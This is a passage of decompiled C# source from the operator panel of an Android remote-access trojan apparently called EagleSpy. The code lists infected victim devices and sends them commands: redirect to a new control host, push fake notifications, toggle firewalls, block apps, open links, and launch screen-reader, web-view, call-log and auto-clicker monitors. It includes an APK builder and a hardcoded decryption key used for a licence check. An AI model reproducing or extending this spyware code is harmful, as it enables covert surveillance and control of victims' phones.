		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.bigtitletext.Text = "Blocked List";
			}
			else
			{
				this.bigtitletext.Text = "禁止名单";
			}
		}
		else
		{
			this.bigtitletext.Text = "قائمة الحظر";
		}
	}

	// Token: 0x06000439 RID: 1081 RVA: 0x0005FA18 File Offset: 0x0005DC18
	private void Connection_btn_Click(object sender, EventArgs e)
	{
		try
		{
			this.DataLog.BringToFront();
			this.DataLog.Visible = true;
			this.clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					this.bigtitletext.Text = "Connections";
				}
				else
				{
					this.bigtitletext.Text = "电信";
				}
			}
			else
			{
				this.bigtitletext.Text = "الاتصالات";
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600043A RID: 1082 RVA: 0x0005FABC File Offset: 0x0005DCBC
	private void DrakeUIAvatar1_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0)
		{
			try
			{
				List<Client> list = new List<Client>();
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								list.Add(client);
							}
						}
					}
					catch (Exception)
					{
					}
				}
				if (list.Count > 0)
				{
					EditConnections editConnections = new EditConnections(list);
					if (editConnections.ShowDialog() == DialogResult.OK && editConnections.SelectedList.Count > 0)
					{
						foreach (Client client2 in editConnections.SelectedList)
						{
							TcpClient myClient = client2.myClient;
							string newHost = editConnections.NewHost;
							string newPort = editConnections.NewPort;
							string newName = editConnections.NewName;
							string[] array = client2.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"EHP<*>",
									newHost,
									"#",
									newPort,
									"#",
									newName,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									client2.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								client2
							};
							client2.SendMessage(parametersObjects);
						}
						EagleAlert.ShowSucess("Connection Edit Successfully");
					}
					editConnections.Dispose();
				}
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		EagleAlert.Showinformation("No Clients Found");
	}

	// Token: 0x0600043B RID: 1083 RVA: 0x0005C478 File Offset: 0x0005A678
	public string isinteger(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		ASCIIEncoding asciiencoding = new ASCIIEncoding();
		byte[] bytes = asciiencoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
		}
		return "";
	}

	// Token: 0x0600043C RID: 1084 RVA: 0x0005A7E4 File Offset: 0x000589E4
	private void ToolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SC_Readv2_" + client.ClientAddressIP;
								ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
								if (screenReaderV == null)
								{
									new ScreenReaderV2
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600043D RID: 1085 RVA: 0x0005FD88 File Offset: 0x0005DF88
	private void Checkupdate_Tick(object sender, EventArgs e)
	{
		try
		{
		}
		catch (Exception)
		{
			this.checkupdate.Stop();
		}
	}

	// Token: 0x0600043E RID: 1086 RVA: 0x0000206C File Offset: 0x0000026C
	private void Mapworker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	// Token: 0x0600043F RID: 1087 RVA: 0x0005FDB8 File Offset: 0x0005DFB8
	private void Mapworker_DoWork_1(object sender, DoWorkEventArgs e)
	{
		EagleSpyMain._Closure_0024__171_002D0 closure_0024__171_002D = null;
		checked
		{
			while (this.Alive)
			{
				Thread.Sleep(10000);
				try
				{
					if (this.ClientsWindow.Rows.Count > 0)
					{
						try
						{
							closure_0024__171_002D = new EagleSpyMain._Closure_0024__171_002D0(closure_0024__171_002D);
							closure_0024__171_002D._0024VB_0024Local_keyValues = new Dictionary<string, double>();
							int num = this.ClientsWindow.Rows.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								string key = Data.GeoIP0.LookupCountryCode(((Client)this.ClientsWindow.Rows[i].Cells[8].Tag).ClientAddressIP.ToString().Trim()).ToUpper();
								closure_0024__171_002D._0024VB_0024Local_keyValues[key] = (double)this.ran.Next(100, 1000);
							}
							base.Invoke(new VB_0024AnonymousDelegate_0(closure_0024__171_002D._Lambda_0024__0));
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x06000440 RID: 1088 RVA: 0x0005FED4 File Offset: 0x0005E0D4
	private void Statustimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				float num = this.cpuCounter.NextValue();
				this.drakeUIMeter1.Value = (double)num;
				if (Operators.CompareString(this.temptext, this.recvtotal.Text, false) == 0)
				{
					this.recvtotal.Text = "Received 0 Bytes";
				}
				else
				{
					this.temptext = this.recvtotal.Text;
				}
				if (Operators.CompareString(this.temptext2, this.senttotal.Text, false) == 0)
				{
					this.senttotal.Text = "Sent 0 Bytes";
				}
				else
				{
					this.temptext2 = this.senttotal.Text;
				}
				int num2 = this.server.Count - 1;
				long num3 = 0L;
				long num4 = 0L;
				for (int num5 = 0; num5 <= num2; num5++)
				{
					try
					{
						num3 += this.server[num5].BytesSent;
						num4 += this.server[num5].BytesReceived;
					}
					catch (Exception)
					{
					}
				}
				Array array = Codes.UploadDownload(num3, num4);
				this.recvtotal.Text = Conversions.ToString(Operators.ConcatenateObject("Received : ", array.GetValue(0)));
				this.label6.Text = Conversions.ToString(this.ClientsWindow.Rows.Count);
				this.label1.Text = Conversions.ToString(Operators.ConcatenateObject("", array.GetValue(0)));
				this.label2.Text = Conversions.ToString(Operators.ConcatenateObject("", array.GetValue(1)));
				this.senttotal.Text = Conversions.ToString(Operators.ConcatenateObject("Sent : ", array.GetValue(1)));
				this.drakeUILabel3.Text = "Selected : " + Conversions.ToString(this.ClientsWindow.SelectedRows.Count);
				this.drakeUILabel2.Text = "CPU : " + num.ToString() + "%";
				this.drakeUILabel4.Text = "Key : " + Data.password;
				this.drakeUILabel1.Text = "Port : " + infoServer.PORTS;
				this.infotext.Text = string.Concat(new string[]
				{
					"Online : ",
					Conversions.ToString(this.ClientsWindow.Rows.Count),
					"\r\nPort : ",
					infoServer.PORTS,
					"\r\nKey :",
					Data.password
				});
				this.infolowtext.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"Ready: ",
					Conversions.ToString(this.ClientsWindow.Rows.Count),
					Strings.Space(5),
					"Selected :",
					this.ClientsWindow.SelectedRows.Count.ToString(),
					Strings.Space(5),
					"Received : "
				}), Operators.AddObject(Operators.AddObject(array.GetValue(0), Strings.Space(5)), "Sent : ")), array.GetValue(1)));
				if (Operators.CompareString(this.label16.Text, Codes.AesDecrypt("g149MONTtQjEFzAAIpgk2w==", "0319749625846139"), false) != 0 && this.ClientsWindow.Rows.Count > 0)
				{
					this.ClientsWindow.Rows.Clear();
				}
			}
			catch (Exception)
			{
			}
			if (Data.LastClient != null && Data.LastClient.isconnected)
			{
				try
				{
					this.lastclientpic.Image = Data.LastClient.Wallpaper;
					this.lastclienttext.Text = string.Concat(new string[]
					{
						Data.LastClient.ClientName,
						"\r\n",
						Data.LastClient.Country,
						"\r\n",
						Data.LastClient.ClientAddressIP
					});
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x06000441 RID: 1089 RVA: 0x0006032C File Offset: 0x0005E52C
	private void Addpo_Click(object sender, EventArgs e)
	{
		checked
		{
			if (string.IsNullOrEmpty(this.toblocktext.Text))
			{
				EagleAlert.Showinformation("Enter ip address to block");
			}
			else
			{
				try
				{
					int num = this.server.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (!this.server[i].Blocklist.Contains(this.toblocktext.Text))
						{
							this.server[i].Blocklist.Add(this.toblocktext.Text);
							Data.MainForm.DGVblocked.Rows.Add(new object[]
							{
								GetFlagThisIp.ThisIp(this.toblocktext.Text),
								this.toblocktext.Text
							});
						}
					}
					EagleAlert.ShowSucess("Client Blocked Successfully");
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x06000442 RID: 1090 RVA: 0x00060424 File Offset: 0x0005E624
	private void ClientsWindow_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
	{
		DataGridViewRow dataGridViewRow = null;
		try
		{
			dataGridViewRow = this.ClientsWindow.Rows[e.RowIndex];
		}
		catch (Exception)
		{
			return;
		}
		try
		{
			Client client = (Client)dataGridViewRow.Cells[8].Tag;
			if (e.ColumnIndex == 8)
			{
				if (dataGridViewRow != null)
				{
					if (client != null && client.isnewnotifi)
					{
						string name = "Notifications_" + client.ClientAddressIP;
						Eaglepopup eaglepopup = (Eaglepopup)MyProject.Application.OpenForms[name];
						if (eaglepopup == null)
						{
							new Eaglepopup
							{
								Location = new Point(Cursor.Position.X, Cursor.Position.Y),
								ClassClient = client
							}.Show();
							dataGridViewRow.Cells[8].Value = Codes.BlankImage();
							client.isnewnotifi = false;
						}
					}
					else
					{
						dataGridViewRow.Cells[8].Value = Codes.BlankImage();
					}
				}
			}
			else if (e.ColumnIndex == 9)
			{
				if (client != null && client.isnewcall)
				{
					string name2 = "Calls_Log_" + client.ClientAddressIP;
					EagleSpyCallLogs eagleSpyCallLogs = (EagleSpyCallLogs)MyProject.Application.OpenForms[name2];
					if (eagleSpyCallLogs == null)
					{
						eagleSpyCallLogs = new EagleSpyCallLogs();
						eagleSpyCallLogs.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
						eagleSpyCallLogs.ClassClient = client;
						dataGridViewRow.Cells[9].Value = Codes.BlankImage();
						client.isnewcall = false;
						eagleSpyCallLogs.Show();
					}
				}
				else
				{
					dataGridViewRow.Cells[9].Value = Codes.BlankImage();
				}
			}
			else if (e.ColumnIndex == 10)
			{
				try
				{
					if (client != null)
					{
						string text = "%" + client.BatteryCharge.Replace("f", "").Replace("t", "");
						dataGridViewRow.Cells[10].ToolTipText = text;
						Rectangle cellDisplayRectangle = this.ClientsWindow.GetCellDisplayRectangle(e.ColumnIndex, e.RowIndex, false);
						this.ToolTips.Show(text, this.ClientsWindow, cellDisplayRectangle.Right, checked(cellDisplayRectangle.Top + cellDisplayRectangle.Height));
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000443 RID: 1091 RVA: 0x00059674 File Offset: 0x00057874
	private void Bigtitletext_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x06000444 RID: 1092 RVA: 0x00059674 File Offset: 0x00057874
	private void Label2_MouseDown_1(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x06000445 RID: 1093 RVA: 0x00060718 File Offset: 0x0005E918
	private void Studiobtn_Click(object sender, EventArgs e)
	{
		if (this.ST == null)
		{
			this.ST = new Apk_studio();
			DialogResult dialogResult = this.ST.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.ST.Close();
				this.ST = null;
			}
			else
			{
				this.ST.Close();
				this.ST = null;
			}
		}
	}

	// Token: 0x06000446 RID: 1094 RVA: 0x00060778 File Offset: 0x0005E978
	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		try
		{
			this.notificationspanel.BringToFront();
			this.DataLog.Visible = true;
			this.clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					this.bigtitletext.Text = "Notificatios";
				}
				else
				{
					this.bigtitletext.Text = "通知";
				}
			}
			else
			{
				this.bigtitletext.Text = "التنبيهات";
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000447 RID: 1095 RVA: 0x0006081C File Offset: 0x0005EA1C
	private void DrakeUIButtonIcon10_Click_2(object sender, EventArgs e)
	{
		if (this.DGVNOTF.Rows.Count > 0)
		{
			this.DGVNOTF.Rows.Clear();
		}
	}

	// Token: 0x06000448 RID: 1096 RVA: 0x00060850 File Offset: 0x0005EA50
	private void DrakeUIButtonIcon7_Click_2(object sender, EventArgs e)
	{
		if (this.DGVCALLS.Rows.Count > 0)
		{
			this.DGVCALLS.Rows.Clear();
		}
	}

	// Token: 0x06000449 RID: 1097 RVA: 0x00060884 File Offset: 0x0005EA84
	private void DrakeUIButtonIcon11_Click_1(object sender, EventArgs e)
	{
		if (this.DGVALRTS.Rows.Count > 0)
		{
			this.DGVALRTS.Rows.Clear();
		}
	}

	// Token: 0x0600044A RID: 1098 RVA: 0x000608B8 File Offset: 0x0005EAB8
	private void Porttext_TextChanged(object sender, EventArgs e)
	{
		if (!(string.IsNullOrEmpty(this.porttext.Text) | string.IsNullOrWhiteSpace("porttext.Text")) && !Versioned.IsNumeric(this.porttext.Text))
		{
			EagleAlert.Showinformation("Only Enter Numbers");
			this.porttext.Text = "";
		}
	}

	// Token: 0x0600044B RID: 1099 RVA: 0x00060914 File Offset: 0x0005EB14
	private void Rempo_Click(object sender, EventArgs e)
	{
		if (this.DGVSERVS.Rows.Count >= 1)
		{
			if (this.DGVSERVS.SelectedRows.Count == 0)
			{
				EagleAlert.Showinformation("Select Port First");
			}
			else
			{
				DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[2].Value, "ON", false))
					{
						EagleAlert.Showinformation("Stop Server First");
					}
					else
					{
						this.DGVSERVS.Rows.Remove(dataGridViewRow);
					}
				}
			}
		}
	}

	// Token: 0x0600044C RID: 1100 RVA: 0x000609AC File Offset: 0x0005EBAC
	private void DrakeUIButtonIcon15_Click(object sender, EventArgs e)
	{
		if (this.DGVSERVS.Rows.Count >= 1 && this.DGVSERVS.SelectedRows.Count == 0)
		{
			EagleAlert.Showinformation("Select Port First");
		}
	}

	// Token: 0x0600044D RID: 1101 RVA: 0x000609F0 File Offset: 0x0005EBF0
	private void DrakeUIButtonIcon14_Click(object sender, EventArgs e)
	{
		try
		{
			this.serverspanel.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					this.bigtitletext.Text = "Servers";
				}
				else
				{
					this.bigtitletext.Text = "服务器";
				}
			}
			else
			{
				this.bigtitletext.Text = "المخدمات";
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600044E RID: 1102 RVA: 0x000609AC File Offset: 0x0005EBAC
	private void Exitbtn_Click(object sender, EventArgs e)
	{
		if (this.DGVSERVS.Rows.Count >= 1 && this.DGVSERVS.SelectedRows.Count == 0)
		{
			EagleAlert.Showinformation("Select Port First");
		}
	}

	// Token: 0x0600044F RID: 1103 RVA: 0x00060A7C File Offset: 0x0005EC7C
	private void DrakeUIAvatar4_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0)
		{
			try
			{
				List<Client> list = new List<Client>();
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								list.Add(client);
							}
						}
					}
					catch (Exception)
					{
					}
				}
				if (list.Count > 0)
				{
					NotificationMaker notificationMaker = new NotificationMaker(list);
					if (notificationMaker.ShowDialog() == DialogResult.OK && notificationMaker.SelectedList.Count > 0)
					{
						foreach (Client client2 in notificationMaker.SelectedList)
						{
							TcpClient myClient = client2.myClient;
							string text = notificationMaker.titletext.Text;
							if (string.IsNullOrEmpty(text))
							{
								text = "null";
							}
							string text2 = notificationMaker.msgtext.Text;
							if (string.IsNullOrEmpty(text2))
							{
								text2 = "null";
							}
							string type = notificationMaker.type;
							string openthis = notificationMaker.Openthis;
							string text3 = "1";
							if (notificationMaker.checkusrcraxs.Checked)
							{
								text3 = "0";
							}
							string text4 = string.Concat(new string[]
							{
								text,
								">",
								text2,
								">",
								type,
								">",
								openthis,
								">",
								text3,
								">"
							});
							string[] array = client2.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text4,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									client2.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								client2
							};
							client2.SendMessage(parametersObjects);
						}
						EagleAlert.ShowSucess("Notification Sent Successfully");
					}
					notificationMaker.Dispose();
				}
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		EagleAlert.Showinformation("No Clients Found");
	}

	// Token: 0x06000450 RID: 1104 RVA: 0x00060DC8 File Offset: 0x0005EFC8
	private void DrakeUIAvatar8_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.IsonVPN)
			{
				Codes.MyMsgBox("Alert", "Firewall is already active", false, Resources.warning48px);
			}
			else
			{
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				int value = 0;
				int value2 = 0;
				if (Codes.MyMsgBox("Alert", "Client will restart connection", true, Resources.warning48px))
				{
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"FW<*>S",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(value),
							Data.SPL_SOCKET,
							Conversions.ToString(value2),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
					Thread.Sleep(1000);
					client.Close(client.myClient);
				}
			}
		}
	}

	// Token: 0x06000451 RID: 1105 RVA: 0x00060F68 File Offset: 0x0005F168
	private void DrakeUIAvatar9_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (!client.IsonVPN)
			{
				Codes.MyMsgBox("Alert", "Firewall is already disabled", false, Resources.warning48px);
			}
			else
			{
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				int value = 0;
				int value2 = 0;
				if (Codes.MyMsgBox("Alert", "Client will restart connection", true, Resources.warning48px))
				{
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"FW<*>T",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(value),
							Data.SPL_SOCKET,
							Conversions.ToString(value2),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
					Thread.Sleep(1000);
					client.Close(client.myClient);
				}
			}
		}
	}

	// Token: 0x06000452 RID: 1106 RVA: 0x0006110C File Offset: 0x0005F30C
	private void DrakeUIAvatar5_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				client.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"FW<*>C",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					client.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000453 RID: 1107 RVA: 0x00061250 File Offset: 0x0005F450
	private void AllowAppToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
				}
				else if (Operators.CompareString(this.DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", false) == 0)
				{
					EagleAlert.Showinformation("Select app is not Blocked.");
				}
				else
				{
					string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
					string[] array = client.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"FW<*>A>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
	}

	// Token: 0x06000454 RID: 1108 RVA: 0x0006144C File Offset: 0x0005F64C
	private void ToolStripMenuItem15_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
				}
				else if (Operators.CompareString(this.DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", false) != 0)
				{
					EagleAlert.Showinformation("Select app is already Blocked.");
				}
				else
				{
					string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
					string[] array = client.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"FW<*>B>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
	}

	// Token: 0x06000455 RID: 1109 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIAvatar10_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000456 RID: 1110 RVA: 0x0005CE10 File Offset: 0x0005B010
	private void DrakeUIButtonIcon17_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Web_Browser_" + client.ClientAddressIP;
								WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
								if (webViewMonitor == null)
								{
									new WebViewMonitor
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP),
										Tag = client.ClientAddressIP,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000457 RID: 1111 RVA: 0x0005D0E0 File Offset: 0x0005B2E0
	private void DrakeUIButtonIcon18_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Auto_Clicker_" + client.ClientRemoteAddress;
								Auto_Clicker auto_Clicker = (Auto_Clicker)MyProject.Application.OpenForms[name];
								if (auto_Clicker != null)
								{
									break;
								}
								new Auto_Clicker
								{
									Name = name,
									Classclient = client
								}.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000458 RID: 1112 RVA: 0x0005DFFC File Offset: 0x0005C1FC
	private void DrakeUIButtonIcon19_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lnk<*>",
										reso.ChekLink(dialog.Mytext.Text),
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000459 RID: 1113 RVA: 0x00002A26 File Offset: 0x00000C26
	private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
	{
		this.TRKPANEL.BringToFront();
	}

	// Token: 0x0600045A RID: 1114 RVA: 0x00002A33 File Offset: 0x00000C33
	private void DrakeUIButtonIcon14_Click_1(object sender, EventArgs e)
	{
		this.FWPANEL.BringToFront();
	}

	// Token: 0x0600045B RID: 1115 RVA: 0x00061648 File Offset: 0x0005F848
	private void DrakeUIAvatar11_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
